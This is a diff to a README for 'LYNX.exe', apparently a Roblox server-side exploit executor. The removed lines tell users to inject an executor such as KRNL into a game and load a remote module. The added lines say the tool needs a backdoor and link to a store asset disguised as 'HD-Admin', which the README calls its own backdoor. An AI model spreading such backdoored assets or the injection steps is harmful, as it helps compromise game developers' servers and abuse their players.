@@ -1,8 +1,8 @@
 # LYNX.exe Server-Side Executor
 
 ## How To Use
-Begin by opening any executor, such as Hydrogen, KRNL, etc. Once it has loaded, inject it into a game on Roblox, and execute the following code:
-```require(18410334661).load("YOUR-USERNAME")```. Please make sure to replace YOUR-USERNAME with your actual Roblox username.
+LYNX.exe can only be used with a backdoor in a game. Below is a link to our backdoor:
+* [Backdoor1](https://create.roblox.com/store/asset/18410527712/HD-Admin)
 
 Once you see the LYNX.exe HUD, you are done launching LYNX.exe!
 
@@ -11,7 +11,7 @@ There are also buttons on the side which you can click, and then click the "Exec
 As of now, there are only 3 buttons:
 * Infinite Yield
 * HD Admin Ranker
-* Dex Explorer (2024 Working)
+* DEX Explorer (2024 working)
 
 More will be added soon!
 
